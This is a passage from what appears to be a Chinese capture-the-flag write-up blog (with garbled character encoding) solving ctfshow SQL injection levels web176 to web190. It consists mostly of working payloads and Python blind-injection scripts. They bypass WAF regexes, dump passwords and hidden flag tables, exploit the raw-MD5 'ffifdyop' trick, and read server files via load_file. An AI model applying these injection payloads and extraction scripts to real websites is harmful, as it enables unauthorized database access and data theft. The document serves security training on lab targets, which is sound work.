1;&quot;</span>;</span><br></pre></td></tr></table></figure><p>è¿”å›é€»è¾‘</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">//å¯¹ä¼ å…¥çš„å‚æ•°è¿›è¡Œäº†è¿‡æ»¤</span></span><br><span class="line">  <span class="function"><span class="keyword">function</span> <span class="title">waf</span>(<span class="params"><span class="variable">$str</span></span>)</span>&#123;</span><br><span class="line">   <span class="comment">//ä»£ç è¿‡äºç®€å•ï¼Œä¸å®œå±•ç¤º</span></span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure><p>åŸºæœ¬ä¸Šæ²¡è¿‡æ»¤</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">-1&#x27; or id = &#x27;26</span><br><span class="line">-1&#x27; or username=&#x27;flag</span><br><span class="line">-1&#x27; or &#x27;1</span><br></pre></td></tr></table></figure><h2 id="web177"><a href="#web177" class="headerlink" title="web177"></a>web177</h2><p>è¿‡æ»¤äº†ç©ºæ ¼</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">-1&#x27;/**/or/**/username=&#x27;flag</span><br><span class="line">-1&#x27;or`username`=&#x27;flag</span><br><span class="line">-1&#x27;or`id`=&#x27;26</span><br><span class="line">-1&#x27;union%0bselect/**/1,2,password/**/from/**/ctfshow_user%23</span><br></pre></td></tr></table></figure><h2 id="web178"><a href="#web178" class="headerlink" title="web178"></a>web178</h2><p>åœ¨ä¸Šä¸€é¢˜åŸºç¡€ä¸Šè¿‡æ»¤äº†<code>/**/</code>(é™¤äº†ä¸‹è¿°<code>payload</code>ï¼Œä¹Ÿå¯ä»¥ç”¨%0aï¼Œ%09)</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">-1&#x27;or`username`=&#x27;flag</span><br><span class="line">-1&#x27;or`id`=&#x27;26</span><br><span class="line">-1&#x27;union%0bselect%0b1,2,password%0bfrom%0bctfshow_user%23</span><br></pre></td></tr></table></figure><h2 id="web179"><a href="#web179" class="headerlink" title="web179"></a>web179</h2><p>åˆè¿‡æ»¤äº†%0aå’Œ%09</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">-1&#x27;or`id`=&#x27;26</span><br><span class="line">-1&#x27;or`username`=&#x27;flag</span><br><span class="line">-1&#x27;or`username`like&#x27;%fla%</span><br><span class="line">1&#x27;||1%23</span><br><span class="line">-1&#x27;union%0cselect%0c1,2,password%0cfrom%0cctfshow_user%23</span><br></pre></td></tr></table></figure><h2 id="web180"><a href="#web180" class="headerlink" title="web180"></a>web180</h2><p>è¿‡æ»¤äº†æ³¨é‡Šç¬¦<code>#</code>å’Œ<code>--</code></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">-1&#x27;or`id`=&#x27;26</span><br><span class="line">-1&#x27;or`username`=&#x27;flag</span><br><span class="line">-1&#x27;or`username`like&#x27;%fla%</span><br><span class="line">-1&#x27;||username=&#x27;flag</span><br><span class="line">-1&#x27;union%0cselect%0c1,(select%0cpassword%0cfrom%0cctfshow_user%0cwhere`username`=&#x27;flag&#x27;),&#x27;3</span><br></pre></td></tr></table></figure><h2 id="web181"><a href="#web181" class="headerlink" title="web181"></a>web181</h2><p>è¿”å›é€»è¾‘</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">//å¯¹ä¼ å…¥çš„å‚æ•°è¿›è¡Œäº†è¿‡æ»¤</span></span><br><span class="line">  <span class="function"><span class="keyword">function</span> <span class="title">waf</span>(<span class="params"><span class="variable">$str</span></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/ |\*|\x09|\x0a|\x0b|\x0c|\x00|\x0d|\xa0|\x23|\#|file|into|select/i&#x27;</span>, <span class="variable">$str</span>);</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure><p>ç¦ç”¨äº†ä¸€äº›å­—ç¬¦</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">-1&#x27;or`id`=&#x27;26</span><br><span class="line">-1&#x27;or`username`=&#x27;flag</span><br><span class="line">-1&#x27;or`username`like&#x27;%fla%</span><br><span class="line">-1&#x27;||username=&#x27;flag</span><br></pre></td></tr></table></figure><h2 id="web182"><a href="#web182" class="headerlink" title="web182"></a>web182</h2><p>è¿”å›é€»è¾‘</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">//å¯¹ä¼ å…¥çš„å‚æ•°è¿›è¡Œäº†è¿‡æ»¤</span></span><br><span class="line">  <span class="function"><span class="keyword">function</span> <span class="title">waf</span>(<span class="params"><span class="variable">$str</span></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/ |\*|\x09|\x0a|\x0b|\x0c|\x00|\x0d|\xa0|\x23|\#|file|into|select|flag/i&#x27;</span>, <span class="variable">$str</span>);</span><br><span class="line">  &#125;      </span><br></pre></td></tr></table></figure><p>flagç»™è¿‡æ»¤äº†ï¼Œæ¨¡ç³ŠåŒ¹é…æˆ–è€…æ­£åˆ™å³å¯</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">-1&#x27;or`username`like&#x27;%fla%</span><br><span class="line">-1&#x27;||(username)regexp&#x27;f</span><br><span class="line">-1&#x27;||(password)regexp&#x27;f</span><br></pre></td></tr></table></figure><h2 id="web183"><a href="#web183" class="headerlink" title="web183"></a>web183</h2><p>æŸ¥è¯¢è¯­å¥</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">//æ‹¼æ¥sqlè¯­å¥æŸ¥æ‰¾æŒ‡å®šIDç”¨æˆ·</span></span><br><span class="line">  <span class="variable">$sql</span> = <span class="string">&quot;select count(pass) from &quot;</span>.<span class="variable">$_POST</span>[<span class="string">&#x27;tableName&#x27;</span>].<span class="string">&quot;;&quot;</span>;</span><br></pre></td></tr></table></figure><p>è¿”å›é€»è¾‘</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">//å¯¹ä¼ å…¥çš„å‚æ•°è¿›è¡Œäº†è¿‡æ»¤</span></span><br><span class="line">  <span class="function"><span class="keyword">function</span> <span class="title">waf</span>(<span class="params"><span class="variable">$str</span></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/ |\*|\x09|\x0a|\x0b|\x0c|\x0d|\xa0|\x00|\#|\x23|file|\=|or|\x7c|select|and|flag|into/i&#x27;</span>, <span class="variable">$str</span>);</span><br><span class="line">  &#125;      </span><br></pre></td></tr></table></figure><p>æŸ¥è¯¢ç»“æœ</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">//è¿”å›ç”¨æˆ·è¡¨çš„è®°å½•æ€»æ•°</span></span><br><span class="line">      <span class="variable">$user_count</span> = <span class="number">0</span>;</span><br></pre></td></tr></table></figure><p>æ ¹æ®è¿”å›çš„è®°å½•æ€»æ•°ç›²æ³¨å³å¯</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#encoding: utf-8</span></span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"><span class="keyword">import</span> threading</span><br><span class="line"><span class="keyword">import</span> urllib</span><br><span class="line"></span><br><span class="line">letters = string.ascii_letters + string.digits + <span class="string">&#x27;-&#125;&#123;_&#x27;</span></span><br><span class="line">url = <span class="string">&#x27;http://799ce76f-af36-4e17-a4ef-deef39f0d322.challenge.ctf.show/select-waf.php&#x27;</span></span><br><span class="line">stop = <span class="literal">False</span></span><br><span class="line">flag = <span class="string">&#x27;ctfshow&#123;&#x27;</span></span><br><span class="line"><span class="keyword">while</span> stop <span class="keyword">is</span> <span class="literal">False</span>:</span><br><span class="line"><span class="keyword">for</span> c <span class="keyword">in</span> letters:</span><br><span class="line">payload = flag + c</span><br><span class="line">data = &#123;</span><br><span class="line"><span class="string">&quot;tableName&quot;</span>:<span class="string">f&quot;(ctfshow_user)where(pass)like&#x27;%<span class="subst">&#123;payload&#125;</span>%&#x27;&quot;</span></span><br><span class="line"><span class="comment"># ä¹Ÿå¯ä»¥ç”¨è¿™å‡ ç§payload</span></span><br><span class="line"><span class="comment"># &quot;tableName&quot;:f&quot;`ctfshow_user`where`pass`like&#x27;%&#123;payload&#125;%&#x27;&quot;</span></span><br><span class="line"><span class="comment"># &quot;tableName&quot;:f&#x27;(ctfshow_user)where(pass)regexp(&quot;^&#123;payload&#125;&quot;)&#x27;</span></span><br><span class="line">&#125;</span><br><span class="line">response = requests.post(url=url, data=data)</span><br><span class="line"><span class="keyword">if</span> <span class="string">&#x27;user_count = 1;&#x27;</span> <span class="keyword">in</span> response.text:</span><br><span class="line"><span class="keyword">if</span> c == <span class="string">&#x27;&#125;&#x27;</span>:</span><br><span class="line">stop = <span class="literal">True</span></span><br><span class="line">flag = payload</span><br><span class="line"><span class="built_in">print</span>(flag)</span><br><span class="line"><span class="keyword">break</span></span><br></pre></td></tr></table></figure><h2 id="web184"><a href="#web184" class="headerlink" title="web184"></a>web184</h2><p>æŸ¥è¯¢è¯­å¥</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">//æ‹¼æ¥sqlè¯­å¥æŸ¥æ‰¾æŒ‡å®šIDç”¨æˆ·</span></span><br><span class="line">  <span class="variable">$sql</span> = <span class="string">&quot;select count(*) from &quot;</span>.<span class="variable">$_POST</span>[<span class="string">&#x27;tableName&#x27;</span>].<span class="string">&quot;;&quot;</span>;</span><br></pre></td></tr></table></figure><p>è¿”å›é€»è¾‘</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">//å¯¹ä¼ å…¥çš„å‚æ•°è¿›è¡Œäº†è¿‡æ»¤</span></span><br><span class="line">  <span class="function"><span class="keyword">function</span> <span class="title">waf</span>(<span class="params"><span class="variable">$str</span></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/\*|\x09|\x0a|\x0b|\x0c|\0x0d|\xa0|\x00|\#|\x23|file|\=|or|\x7c|select|and|flag|into|where|\x26|\&#x27;|\&quot;|union|\`|sleep|benchmark/i&#x27;</span>, <span class="variable">$str</span>);</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure><p>æŸ¥è¯¢ç»“æœ</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">//è¿”å›ç”¨æˆ·è¡¨çš„è®°å½•æ€»æ•°</span></span><br><span class="line">      <span class="variable">$user_count</span> = <span class="number">0</span>;</span><br></pre></td></tr></table></figure><p>å¼•å·éƒ½è¢«ç¦ç”¨äº†ï¼Œä½†ç©ºæ ¼æ”¾å‡ºæ¥äº†</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#encoding: utf-8</span></span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"><span class="keyword">import</span> threading</span><br><span class="line"><span class="keyword">import</span> urllib</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">letters = string.ascii_letters + string.digits + <span class="string">&#x27;-&#125;&#123;_&#x27;</span></span><br><span class="line">url = <span class="string">&#x27;http://2e4133ff-13ae-4038-9b6e-ce069aa25427.challenge.ctf.show/select-waf.php&#x27;</span></span><br><span class="line">stop = <span class="literal">False</span></span><br><span class="line">flag = <span class="string">&#x27;ctfshow&#123;&#x27;</span></span><br><span class="line">hex_flag = <span class="string">&#x27;0x63746673686F777B&#x27;</span></span><br><span class="line"><span class="keyword">while</span> stop <span class="keyword">is</span> <span class="literal">False</span>:</span><br><span class="line"><span class="keyword">for</span> c <span class="keyword">in</span> letters:</span><br><span class="line">payload = hex_flag + <span class="built_in">hex</span>(<span class="built_in">ord</span>(c))[<span class="number">2</span>:]</span><br><span class="line">data = &#123;</span><br><span class="line"><span class="string">&quot;tableName&quot;</span>:<span class="string">f&quot;ctfshow_user group by pass having pass regexp(<span class="subst">&#123;payload&#125;</span>)&quot;</span></span><br><span class="line">&#125;</span><br><span class="line">response = requests.post(url=url, data=data)</span><br><span class="line"><span class="keyword">if</span> <span class="string">&#x27;user_count = 1;&#x27;</span> <span class="keyword">in</span> response.text:</span><br><span class="line"><span class="keyword">if</span> c == <span class="string">&#x27;&#125;&#x27;</span>:</span><br><span class="line">stop = <span class="literal">True</span></span><br><span class="line">hex_flag = payload</span><br><span class="line">flag += c</span><br><span class="line"><span class="built_in">print</span>(flag)</span><br><span class="line"><span class="keyword">break</span></span><br></pre></td></tr></table></figure><h2 id="web185-186"><a href="#web185-186" class="headerlink" title="web185-186"></a>web185-186</h2><p>ä¸èƒ½ç”¨æ•°å­—äº†ï¼Œè€ƒè™‘ç”¨<code>char</code>å’Œ<code>true</code>æ„é€ å‡ºå­—æ¯ï¼Œç„¶åç”¨<code>concat</code>æ‹¼æ¥èµ·æ¥</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#encoding: utf-8</span></span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"><span class="keyword">import</span> threading</span><br><span class="line"><span class="keyword">import</span> urllib</span><br><span class="line"></span><br><span class="line"><span class="comment"># æˆ‘è¿™é‡Œä½¿ç”¨äº†å¾ˆå¤šä¸ªtrueæ‹¼æ¥ï¼Œä½†å®é™…ä¸Šä¹Ÿå¯ä»¥ä¸€ä½ä¸€ä½çš„ï¼Œæ¯”å¦‚99å¯ä»¥ç”¨&#x27;9&#x27;å’Œ&#x27;9&#x27;æ‹¼èµ·æ¥</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">str_convert</span>(<span class="params">s:<span class="built_in">str</span></span>) -&gt; <span class="built_in">str</span>:</span><br><span class="line">  ss = <span class="string">&#x27;concat(&#x27;</span></span><br><span class="line">  <span class="keyword">for</span> c <span class="keyword">in</span> s:</span><br><span class="line">      ss += <span class="string">f&#x27;char(true&#x27;</span> + <span class="string">&#x27;+true&#x27;</span>*(<span class="built_in">ord</span>(c)-<span class="number">1</span>) + <span class="string">&#x27;),&#x27;</span></span><br><span class="line">  <span class="keyword">return</span> ss[:-<span class="number">1</span>]+<span class="string">&#x27;)&#x27;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">letters = string.ascii_letters + string.digits + <span class="string">&#x27;-&#125;&#123;_&#x27;</span></span><br><span class="line">url = <span class="string">&#x27;http://532df19e-89ba-4a7a-8d31-6c7c7e5bea8e.challenge.ctf.show/select-waf.php&#x27;</span></span><br><span class="line">stop = <span class="literal">False</span></span><br><span class="line">flag = <span class="string">&#x27;ctfshow&#123;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> stop <span class="keyword">is</span> <span class="literal">False</span>:</span><br><span class="line">  <span class="keyword">for</span> c <span class="keyword">in</span> letters:</span><br><span class="line">      payload = str_convert(flag+c)</span><br><span class="line">      data = &#123;</span><br><span class="line">          <span class="string">&quot;tableName&quot;</span>:<span class="string">f&quot;ctfshow_user group by pass having pass regexp(<span class="subst">&#123;payload&#125;</span>)&quot;</span></span><br><span class="line">      &#125;</span><br><span class="line">      response = requests.post(url=url, data=data)</span><br><span class="line">      <span class="keyword">if</span> <span class="string">&#x27;user_count = 1;&#x27;</span> <span class="keyword">in</span> response.text:</span><br><span class="line">          <span class="keyword">if</span> c == <span class="string">&#x27;&#125;&#x27;</span>:</span><br><span class="line">              stop = <span class="literal">True</span></span><br><span class="line">          flag += c</span><br><span class="line">          <span class="built_in">print</span>(flag)</span><br><span class="line">          <span class="keyword">break</span></span><br></pre></td></tr></table></figure><h2 id="web187"><a href="#web187" class="headerlink" title="web187"></a>web187</h2><p>æŸ¥è¯¢è¯­å¥</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">//æ‹¼æ¥sqlè¯­å¥æŸ¥æ‰¾æŒ‡å®šIDç”¨æˆ·</span></span><br><span class="line">  <span class="variable">$sql</span> = <span class="string">&quot;select count(*) from ctfshow_user where username = &#x27;<span class="subst">$username</span>&#x27; and password= &#x27;<span class="subst">$password</span>&#x27;&quot;</span>;</span><br></pre></td></tr></table></figure><p>è¿”å›é€»è¾‘</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$username</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;username&#x27;</span>];</span><br><span class="line"><span class="variable">$password</span> = <span class="title function_ invoke__">md5</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;password&#x27;</span>],<span class="literal">true</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">//åªæœ‰adminå¯ä»¥è·å¾—flag</span></span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$username</span>!=<span class="string">&#x27;admin&#x27;</span>)&#123;</span><br><span class="line">    <span class="variable">$ret</span>[<span class="string">&#x27;msg&#x27;</span>]=<span class="string">&#x27;ç”¨æˆ·åä¸å­˜åœ¨&#x27;</span>;</span><br><span class="line">    <span class="keyword">die</span>(<span class="title function_ invoke__">json_encode</span>(<span class="variable">$ret</span>));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>å½“MD5å‡½æ•°çš„ç¬¬äºŒä¸ªå‚æ•°ä¸ºtrueæ—¶ï¼Œè¿”å›çš„æ˜¯å­—ç¬¦ä¸²ã€‚</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">md5(&#x27;ffifdyop&#x27;,true)= &#x27;or&#x27;6\xc9]\x99\xe9!r,\xf9\xedb\x1c</span><br></pre></td></tr></table></figure><p>æ‰€ä»¥æ‰”è¿›<code>sql</code>è¯­å¥ä¸­æ­£å¥½èƒ½é—­åˆå¹¶ä¸”<code>or</code>åé¢æ˜¯ä¸ªå®Œæ•´å­—ç¬¦ä¸²ä¸”å¼€å¤´ä¸º<code>6</code>ï¼Œæ•…æ’ä¸ºçœŸï¼ˆè²Œä¼¼å­—ç¬¦ä¸²å’Œä¸€ä¸ªé0æ•°å­—å¼€å¤´çš„å­—ç¬¦ä¸²å»<code>or</code>ç»“æœæ’ä¸ºçœŸï¼‰</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">username=admin&amp;password=ffifdyop</span><br></pre></td></tr></table></figure><h2 id="web188"><a href="#web188" class="headerlink" title="web188"></a>web188</h2><p>æŸ¥è¯¢è¯­å¥</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">//æ‹¼æ¥sqlè¯­å¥æŸ¥æ‰¾æŒ‡å®šIDç”¨æˆ·</span></span><br><span class="line"><span class="variable">$sql</span> = <span class="string">&quot;select pass from ctfshow_user where username = <span class="subst">&#123;$username&#125;</span>&quot;</span>;</span><br></pre></td></tr></table></figure><p>è¿”å›é€»è¾‘</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">//ç”¨æˆ·åæ£€æµ‹</span></span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/and|or|select|from|where|union|join|sleep|benchmark|,|\(|\)|\&#x27;|\&quot;/i&#x27;</span>, <span class="variable">$username</span>))&#123;</span><br><span class="line">  <span class="variable">$ret</span>[<span class="string">&#x27;msg&#x27;</span>]=<span class="string">&#x27;ç”¨æˆ·åéæ³•&#x27;</span>;</span><br><span class="line">  <span class="keyword">die</span>(<span class="title function_ invoke__">json_encode</span>(<span class="variable">$ret</span>));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//å¯†ç æ£€æµ‹</span></span><br><span class="line"><span class="keyword">if</span>(!<span class="title function_ invoke__">is_numeric</span>(<span class="variable">$password</span>))&#123;</span><br><span class="line">  <span class="variable">$ret</span>[<span class="string">&#x27;msg&#x27;</span>]=<span class="string">&#x27;å¯†ç åªèƒ½ä¸ºæ•°å­—&#x27;</span>;</span><br><span class="line">  <span class="keyword">die</span>(<span class="title function_ invoke__">json_encode</span>(<span class="variable">$ret</span>));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//å¯†ç åˆ¤æ–­</span></span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$row</span>[<span class="string">&#x27;pass&#x27;</span>]==<span class="title function_ invoke__">intval</span>(<span class="variable">$password</span>))&#123;</span><br><span class="line">    <span class="variable">$ret</span>[<span class="string">&#x27;msg&#x27;</span>]=<span class="string">&#x27;ç™»é™†æˆåŠŸ&#x27;</span>;</span><br><span class="line">    <span class="title function_ invoke__">array_push</span>(<span class="variable">$ret</span>[<span class="string">&#x27;data&#x27;</span>], <span class="keyword">array</span>(<span class="string">&#x27;flag&#x27;</span>=&gt;<span class="variable">$flag</span>));</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure><p>æ²¡ç”¨å•å¼•å·ä¿æŠ¤è¾“å…¥ï¼Œå¼±ç±»å‹æ¯”è¾ƒï¼Œè€Œä¸”å¯†ç å“ªé‡Œæ¯”è¾ƒä¹Ÿæ˜¯<code>==</code></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">username=0</span><br><span class="line">password=0</span><br></pre></td></tr></table></figure><h2 id="web189"><a href="#web189" class="headerlink" title="web189"></a>web189</h2><p>æç¤ºflagåœ¨api&#x2F;index.phpæ–‡ä»¶ä¸­</p><p>æµ‹è¯•åå‘ç°ï¼Œ<code>username=1</code>æ—¶</p><figure class="highlight json"><table><tr><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span><span class="attr">&quot;code&quot;</span><span class="punctuation">:</span><span class="number">0</span><span class="punctuation">,</span><span class="attr">&quot;msg&quot;</span><span class="punctuation">:</span><span class="string">&quot;\u67e5\u8be2\u5931\u8d25&quot;</span><span class="punctuation">,</span><span class="attr">&quot;count&quot;</span><span class="punctuation">:</span><span class="number">0</span><span class="punctuation">,</span><span class="attr">&quot;data&quot;</span><span class="punctuation">:</span><span class="punctuation">[</span><span class="punctuation">]</span><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure><p><code>username=0</code>æ—¶</p><figure class="highlight json"><table><tr><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span><span class="attr">&quot;code&quot;</span><span class="punctuation">:</span><span class="number">0</span><span class="punctuation">,</span><span class="attr">&quot;msg&quot;</span><span class="punctuation">:</span><span class="string">&quot;\u5bc6\u7801\u9519\u8bef&quot;</span><span class="punctuation">,</span><span class="attr">&quot;count&quot;</span><span class="punctuation">:</span><span class="number">0</span><span class="punctuation">,</span><span class="attr">&quot;data&quot;</span><span class="punctuation">:</span><span class="punctuation">[</span><span class="punctuation">]</span><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure><p>ç¼–å†™è„šæœ¬ç›²æ³¨æ–‡ä»¶å†…å®¹</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#encoding: utf-8</span></span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"><span class="keyword">import</span> threading</span><br><span class="line"><span class="keyword">import</span> urllib</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;http://5867279f-effb-40ab-9261-8c7b435da821.challenge.ctf.show/api/&quot;</span></span><br><span class="line"></span><br><span class="line">content = <span class="string">&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">257</span>,<span class="number">257</span>+<span class="number">60</span>):</span><br><span class="line">  <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">32</span>,<span class="number">127</span>):</span><br><span class="line">      data = &#123;</span><br><span class="line">          <span class="string">&quot;username&quot;</span>:<span class="string">f&quot;if(ascii(substr(load_file(&#x27;/var/www/html/api/index.php&#x27;),<span class="subst">&#123;i&#125;</span>,1))=<span class="subst">&#123;j&#125;</span>,1,0)&quot;</span>,</span><br><span class="line">          <span class="string">&quot;password&quot;</span>: <span class="string">&quot;0&quot;</span></span><br><span class="line">      &#125;</span><br><span class="line">      response = requests.post(url=url, data=data)</span><br><span class="line">      <span class="keyword">if</span> <span class="string">&#x27;8d25&#x27;</span> <span class="keyword">in</span> response.text:</span><br><span class="line">          content += <span class="built_in">chr</span>(j)</span><br><span class="line">          <span class="built_in">print</span>(content)</span><br><span class="line">          <span class="keyword">break</span></span><br></pre></td></tr></table></figure><h2 id="web190"><a href="#web190" class="headerlink" title="web190"></a>web190</h2><p>æç¤º<code>ä¸é¥¿</code>ï¼Œåº”è¯¥æ˜¯<code>å¸ƒå°”ç›²æ³¨</code></p><p>æŸ¥è¯¢è¯­å¥</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">//æ‹¼æ¥sqlè¯­å¥æŸ¥æ‰¾æŒ‡å®šIDç”¨æˆ·</span></span><br><span class="line"><span class="variable">$sql</span> = <span class="string">&quot;select pass from ctfshow_user where username = &#x27;<span class="subst">&#123;$username&#125;</span>&#x27;&quot;</span>;</span><br></pre></td></tr></table></figure><p>è¿”å›é€»è¾‘</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">//å¯†ç æ£€æµ‹</span></span><br><span class="line"><span class="keyword">if</span>(!<span class="title function_ invoke__">is_numeric</span>(<span class="variable">$password</span>))&#123;</span><br><span class="line">  <span class="variable">$ret</span>[<span class="string">&#x27;msg&#x27;</span>]=<span class="string">&#x27;å¯†ç åªèƒ½ä¸ºæ•°å­—&#x27;</span>;</span><br><span class="line">  <span class="keyword">die</span>(<span class="title function_ invoke__">json_encode</span>(<span class="variable">$ret</span>));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//å¯†ç åˆ¤æ–­</span></span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$row</span>[<span class="string">&#x27;pass&#x27;</span>]==<span class="variable">$password</span>)&#123;</span><br><span class="line">    <span class="variable">$ret</span>[<span class="string">&#x27;msg&#x27;</span>]=<span class="string">&#x27;ç™»é™†æˆåŠŸ&#x27;</span>;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//<span class="doctag">TODO:</span>æ„Ÿè§‰å°‘äº†ä¸ªå•¥ï¼Œå¥‡æ€ª</span></span><br></pre></td></tr></table></figure><p>å®¹æ˜“çŸ¥é“<code>admin</code>æ˜¯ç”¨æˆ·åï¼Œåˆ©ç”¨<code>ç”¨æˆ·åå­˜åœ¨ä½†å¯†ç é”™è¯¯</code>å’Œ<code>ç”¨æˆ·åä¸å­˜åœ¨</code>è¿›è¡Œå¸ƒå°”ç›²æ³¨ï¼ŒäºŒåˆ†æ³•ä¼šæ¯”è¾ƒå¿«</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#encoding: utf-8</span></span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"><span class="keyword">import</span> threading</span><br><span class="line"><span class="keyword">import</span> urllib</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;http://0141af7b-45d8-4912-aa34-55e7d58fed51.challenge.ctf.show/api/&quot;</span></span><br><span class="line"></span><br><span class="line">flag = <span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">60</span>):</span><br><span class="line">    l = <span class="number">32</span></span><br><span class="line">    r = <span class="number">127</span></span><br><span class="line">    <span class="keyword">while</span> l &lt; r:</span><br><span class="line">        mid = (l+r)&gt;&gt;<span class="number">1</span></span><br><span class="line">        <span class="keyword">if</span>(mid==l):</span><br><span class="line">            flag += <span class="built_in">chr</span>(mid)</span><br><span class="line">            <span class="built_in">print</span>(flag)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        data = &#123;</span><br><span class="line">            <span class="comment"># æ•°æ®åº“ ctfshow_web </span></span><br><span class="line">            <span class="comment"># &quot;username&quot;:f&quot;admin&#x27;and (ascii(substr((select database()),&#123;i&#125;,1))&lt;&#123;mid&#125;)#&quot;,</span></span><br><span class="line"></span><br><span class="line">            <span class="comment"># è¡¨å ctfshow_fl0g,ctfshow_user</span></span><br><span class="line">            <span class="comment"># &quot;username&quot;:f&quot;admin&#x27;and (ascii(substr((select group_concat(table_name)from information_schema.tables where table_schema=database()),&#123;i&#125;,1))&lt;&#123;mid&#125;)#&quot;,</span></span><br><span class="line">            </span><br><span class="line">            <span class="comment"># åˆ—å id,f1ag</span></span><br><span class="line">            <span class="comment"># &quot;username&quot;:f&quot;admin&#x27;and (ascii(substr((select group_concat(column_name)from information_schema.columns where table_name=&#x27;ctfshow_fl0g&#x27;),&#123;i&#125;,1))&lt;&#123;mid&#125;)#&quot;,</span></span><br><span class="line">            </span><br><span class="line">            <span class="comment"># ctfshow&#123;b9599df1-1080-4bbb-a6d0-2a2c8ad4fd63&#125;</span></span><br><span class="line">            <span class="string">&quot;username&quot;</span>:<span class="string">f&quot;admin&#x27;and (ascii(substr((select group_concat(f1ag)from ctfshow_fl0g),<span class="subst">&#123;i&#125;</span>,1))&lt;<span class="subst">&#123;mid&#125;</span>)#&quot;</span>,</span><br><span class="line">            <span 